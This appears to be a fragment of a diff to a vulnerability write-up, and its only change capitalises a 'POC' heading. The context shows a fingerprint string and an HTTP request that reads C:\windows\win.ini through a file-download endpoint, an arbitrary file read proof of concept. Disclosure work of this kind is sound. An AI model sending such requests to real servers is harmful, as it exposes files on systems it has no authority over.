@@ -8,7 +8,7 @@
 body="Api/UserApi/GetUserName"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /Basics/DownloadInpFile?filePath=C:\windows\win.ini HTTP/1.1
